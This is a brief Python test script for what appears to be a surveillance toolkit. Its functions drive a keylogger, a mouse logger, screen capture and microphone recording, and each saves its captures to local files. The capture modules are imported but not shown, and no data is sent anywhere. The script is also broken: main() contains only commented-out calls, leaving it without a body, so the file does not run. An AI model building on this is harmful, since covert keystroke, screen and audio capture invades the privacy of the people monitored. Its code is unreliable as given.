import keylog
import time
import getImage
import getSound
import Mouselogger

def main():

    # test_keylog(5)
    # test_mouselog(1)
    # test_getImage()
    # test_getSound()


def test_keylog(waittime):
    klog = keylog.KeyLogger()
    klog.start()
    time.sleep(waittime)
    klog.stop()
    klog.write_on_file("test/keyboard.txt")
    # print(klog.keys)

def test_mouselog(waittime):
    mlog = Mouselogger.Mouselog()
    mlog.start()
    time.sleep(waittime)
    mlog.stop()
    mlog.write_on_file("test/mouse.txt")
    # print(mlog.move)
    # print(mlog.clic)
    # print(mlog.scroll)

def test_getImage():
    screen = getImage.GetImage()
    screen.takeScreen()
    screen.takeScreen("test/image.png")

def test_getSound():
    sound = getSound.getSound()
    sound.record(2)
    sound.write_on_file("test/sound.wav")

if __name__ == "__main__":
    main()